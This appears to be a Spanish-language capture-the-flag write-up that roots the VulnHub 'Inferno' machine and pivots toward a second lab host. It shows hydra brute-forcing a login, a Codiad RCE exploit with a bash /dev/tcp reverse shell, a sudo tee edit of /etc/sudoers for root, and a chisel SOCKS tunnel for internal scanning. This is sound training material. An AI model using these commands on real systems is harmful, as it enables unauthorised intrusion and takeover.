# Inferno (vulnhub)
## Reconocimiento
```bash
arp-scan -I wlan0 --localnet
ping -c 1 192.168.1.118

# ans
PING 192.168.1.118 (192.168.1.118) 56(84) bytes of data.
64 bytes from 192.168.1.118: icmp_seq=1 ttl=64 time=0.488 ms

--- 192.168.1.118 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.488/0.488/0.488/0.000 ms

# Se usa gobuster para descubrir las rutas
gobuster dir -u http://192.168.1.118/ -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -t 15
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.1.118/
[+] Method:                  GET
[+] Threads:                 15
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
inferno              (Status: 401) [Size: 460]
server-status        (Status: 403) [Size: 278]


```
## Fuerza bruta
UNa vez se detecta el directorio oculto, sale un pantalla emergente de inicio de sesion. Es necesario ocupar hydra.
![alt text](image.png)

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.1.118 http-get /inferno -t 15
# ans
Hydra v9.7 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-06-16 23:38:20
[DATA] max 15 tasks per 1 server, overall 15 tasks, 14344399 login tries (l:1/p:14344399), ~956294 tries per task
[DATA] attacking http-get://192.168.1.118:80/inferno
[STATUS] 6701.00 tries/min, 6701 tries in 00:01h, 14337698 to do in 35:40h, 15 active
[80][http-get] host: 192.168.1.118   login: admin   password: dante1
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-06-16 23:40:15

# user: admin
# pass: dante1

# Se busca la version del software codiad
searchsploit codiad
# ans
Codiad 2.4.3 - Multiple Vulnerabilities              | php/webapps/35585.txt
Codiad 2.5.3 - Local File Inclusion                  | php/webapps/36371.txt
Codiad 2.8.4 - Remote Code Execution (Authenticated) | multiple/webapps/49705.py
Codiad 2.8.4 - Remote Code Execution (Authenticated) | multiple/webapps/49902.py
Codiad 2.8.4 - Remote Code Execution (Authenticated) | multiple/webapps/49907.py
Codiad 2.8.4 - Remote Code Execution (Authenticated) | multiple/webapps/50474.txt

# Nos traemos a la carpeta acutal de trabajo el script que queramos
searchsploit -m multiple/webapps/49705.py

# Usage
python3 codiad_rce.py
Usage : 
        python codiad_rce.py [URL] [USERNAME] [PASSWORD] [IP] [PORT] [PLATFORM]
        python codiad_rce.py [URL:PORT] [USERNAME] [PASSWORD] [IP] [PORT] [PLATFORM]
Example : 
        python codiad_rce.py http://localhost/ admin admin 8.8.8.8 8888 linux
        python codiad_rce.py http://localhost:8080/ admin admin 8.8.8.8 8888 windows
Author : 
        WangYihang <wangyihanger@gmail.com>

# Se eejcuta el exploit
python3 codiad_rce.py http://admin:dante1@192.168.1.118/inferno/ admin dante1 192.1681.14 443 linux

# Se ejecuta el comando que dice la terminal
# ans
[+] Please execute the following command on your vps: 
echo 'bash -c "bash -i >/dev/tcp/192.168.1.14/444 0>&1 2>&1"' | nc -lnvp 443
nc -lnvp 444
[+] Please confirm that you have done the two command above [y/n]
[Y/n] 

# echo 'bash -c "bash -i >/dev/tcp/192.168.1.14/444 0>&1 2>&1"' | nc -lnvp 443
# nc -nvlp 444

# Se ingresa al sistema

```
# Escalamiento de privilegios
```bash
script /dev/null -c bash
ctrl + z
stty raw -echo;fg
reset xterm 
export TERM=xterm
export SHELL=bash

# Si se desfaza la terminal, se ocupa el spawn de python
python3 -c 'import pty; pty.spawn("/bin/bash")'

# se hace una busqueda de todo l o que hay
find . 2>/dev/null

# Se hace un cat al archivo .dat
cat ./Downloads/.download.dat; echo

# ans
c2 ab 4f 72 20 73 65 e2 80 99 20 74 75 20 71 75 65 6c 20 56 69 72 67 69 6c 69 6f 20 65 20 71 75 65 6c 6c 61 20 66 6f 6e 74 65 0a 63 68 65 20 73 70 61 6e 64 69 20 64 69 20 70 61 72 6c 61 72 20 73 c3 ac 20 6c 61 72 67 6f 20 66 69 75 6d 65 3f c2 bb 2c 0a 72 69 73 70 75 6f 73 e2 80 99 69 6f 20 6c 75 69 20 63 6f 6e 20 76 65 72 67 6f 67 6e 6f 73 61 20 66 72 6f 6e 74 65 2e 0a 0a c2 ab 4f 20 64 65 20 6c 69 20 61 6c 74 72 69 20 70 6f 65 74 69 20 6f 6e 6f 72 65 20 65 20 6c 75 6d 65 2c 0a 76 61 67 6c 69 61 6d 69 20 e2 80 99 6c 20 6c 75 6e 67 6f 20 73 74 75 64 69 6f 20 65 20 e2 80 99 6c 20 67 72 61 6e 64 65 20 61 6d 6f 72 65 0a 63 68 65 20 6d e2 80 99 68 61 20 66 61 74 74 6f 20 63 65 72 63 61 72 20 6c 6f 20 74 75 6f 20 76 6f 6c 75 6d 65 2e 0a 0a 54 75 20 73 65 e2 80 99 20 6c 6f 20 6d 69 6f 20 6d 61 65 73 74 72 6f 20 65 20 e2 80 99 6c 20 6d 69 6f 20 61 75 74 6f 72 65 2c 0a 74 75 20 73 65 e2 80 99 20 73 6f 6c 6f 20 63 6f 6c 75 69 20 64 61 20 63 75 e2 80 99 20 69 6f 20 74 6f 6c 73 69 0a 6c 6f 20 62 65 6c 6c 6f 20 73 74 69 6c 6f 20 63 68 65 20 6d e2 80 99 68 61 20 66 61 74 74 6f 20 6f 6e 6f 72 65 2e 0a 0a 56 65 64 69 20 6c 61 20 62 65 73 74 69 61 20 70 65 72 20 63 75 e2 80 99 20 69 6f 20 6d 69 20 76 6f 6c 73 69 3b 0a 61 69 75 74 61 6d 69 20 64 61 20 6c 65 69 2c 20 66 61 6d 6f 73 6f 20 73 61 67 67 69 6f 2c 0a 63 68 e2 80 99 65 6c 6c 61 20 6d 69 20 66 61 20 74 72 65 6d 61 72 20 6c 65 20 76 65 6e 65 20 65 20 69 20 70 6f 6c 73 69 c2 bb 2e 0a 0a 64 61 6e 74 65 3a 56 31 72 67 31 6c 31 30 68 33 6c 70 6d 33 0a

### REF ---
echo "esto es una prueba"
echo "esto es una prueba" | xxd
# ans
00000000: 6573 746f 2065 7320 756e 6120 7072 7565  esto es una prue
00000010: 6261 0a                                  ba.

echo "esto es una prueba" | xxd -ps
# ans
6573746f20657320756e61207072756562610a

echo -n "6573746f20657320756e61207072756562610a" | xxd -ps -r
# ans
esto es una prueba

$ cat ./Downloads/.download.dat | xxd -ps -r
# ans
«Or se’ tu quel Virgilio e quella fonte
che spandi di parlar sì largo fiume?»,
rispuos’io lui con vergognosa fronte.

«O de li altri poeti onore e lume,
vagliami ’l lungo studio e ’l grande amore
che m’ha fatto cercar lo tuo volume.

Tu se’ lo mio maestro e ’l mio autore,
tu se’ solo colui da cu’ io tolsi
lo bello stilo che m’ha fatto onore.

Vedi la bestia per cu’ io mi volsi;
aiutami da lei, famoso saggio,
ch’ella mi fa tremar le vene e i polsi».

dante:V1rg1l10h3lpm3

ssh dante@192.168.1.118

sudo -l
# ans
Matching Defaults entries for dante on Inferno:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User dante may run the following commands on Inferno:
    (root) NOPASSWD: /usr/bin/tee

### REVIEW ***
echo "i dont make mistakes"
echo "i dont make mistakes" | tee file.txt # show the msg in the console and create the file 

echo "i dont make mistakes" | tee -a file.txt # -a: append content

# We can change the sudoers file
echo "dante ALL=(ALL) NOPASSWD:ALL" | sudo tee -a /etc/sudoers
sudo -l
# ans
Matching Defaults entries for dante on Inferno:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User dante may run the following commands on Inferno:
    (root) NOPASSWD: /usr/bin/tee
    (ALL) NOPASSWD: ALL

sudo su
cat proof.txt
 (        )  (          (        )     )   
 )\ )  ( /(  )\ )       )\ )  ( /(  ( /(   
(()/(  )\())(()/(  (   (()/(  )\()) )\())  
 /(_))((_)\  /(_)) )\   /(_))((_)\ ((_)\   
(_))   _((_)(_))_|((_) (_))   _((_)  ((_)  
|_ _| | \| || |_  | __|| _ \ | \| | / _ \  
 | |  | .` || __| | _| |   / | .` || (_) | 
|___| |_|\_||_|   |___||_|_\ |_|\_| \___/ 


Congrats!

You've rooted Inferno!

77f6f3c544ec0811e2d1243e2e0d1835

mindsflee

https://www.buymeacoffe.com/mindsflee



```
## Conectar intefaz host-only virtualbox
```bash
# en la maquina guest
ip a
# La tercera es tu adaptador Host-Only (puede llamarse enp0s8, enp0s4 o eth1).

sudo ip link set enp0s8 up # levanta la interfaz fisicamente
sudo dhclient enp0s8 # SOlicita una ip al servidor DHCP



```
# INTO MASASHI MACHINE
```bash
### REVIEW ***
timeout 1 bash -c "ping -c 1 10.10.0.10" &>/dev/null && echo "[+] EL host esta activo"
$? # 0 or 1

# hostDiscovery.sh
#!/bin/bash

for i in $(seq 1 254); do
	timeout 1 bash -c "ping -c 1 10.10.0.${i}" &>/dev/null && echo "[+] HOST 10.10.0.${i} - ACTIVE" &	

done; wait

# Buscando los host activos para la maquina masashi
[+] HOST 10.10.0.10 - ACTIVE
[+] HOST 10.10.0.1 - ACTIVE
[+] HOST 10.10.0.2 - ACTIVE
[+] HOST 10.10.0.11 - ACTIVE

# IDENTIFIACION DE PUERTOS
cd /dev/shm
echo '' > /dev/tcp/10.10.0.11/24
# ans
# bash: connect: Connection refused
# bash: /dev/tcp/10.10.0.11/24: Connection refused

echo '' > /dev/tcp/10.10.0.11/22
(echo '' > /dev/tcp/10.10.0.11/24) 2>/dev/null && echo "[+] Puerto abierto"

# ejecutando el shell portscan
[+] PORT 22 - OPEN
[+] PORT 80 - OPEN

# CHISEL (conexion de tipo socs [proxychains])
# en mi maquina se corre como servidor y en la otra como cliente (maquina victima)
# descragar chisel (amd.gz version)
gunzip chisel
chmod +x chisel

# se abre un servidor en python en local para enviar el arhcivo
python3 -m http.server 80

wget http://192.168.1.14/chisel # victims machine

# LOCAL
# en la computadora local se ejecuta chisel como servidor
./chisel server --reverse -p 1234

# en la computadora victima se ejecuta como cliente
./chisel client 192.168.1.14:1234 R:socks

# se asigna automaticametne un puerto
2026/06/21 15:02:34 server: session#1: tun: proxy#R:127.0.0.1:1080=>socks: Listening

# el 1080 tiene que estar en el arhcivo /etc/proxychains4.conf
socks4 127.0.0.1 1080

# se hace el escaneo con nmap
proxychains nmap --top-ports 500 --open -T5 -v -n -sT -Pn 10.10.0.11 2>/dev/null

# ans
Nmap scan report for 10.10.0.11
Host is up (0.0012s latency).
Not shown: 498 closed tcp ports (conn-refused)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

# SE CONFIGURA FOXYPROXY PARA SOCKS5

```
![alt text](image-1.png)

```bash
# SE EJECUTA GOBUSTER
gobuster dir -u http://10.10.0.11/ -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -t 15 --proxy socks5://127.0.0.1:1080

# ans
=======
Starting gobuster in directory enumeration mode
===============================================================
server-status        (Status: 403) [Size: 275]

# SE BUSCA POR EXTENSION DE ARHCIVOS EN ESPECIFICO
gobuster dir -u http://10.10.0.11/ -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -t 15 --proxy socks5://127.0.0.1:1080 -x txt,html,php

# ANS
index.html           (Status: 200) [Size: 10657]
security.txt         (Status: 200) [Size: 54]
robots.txt           (Status: 200) [Size: 72]



```


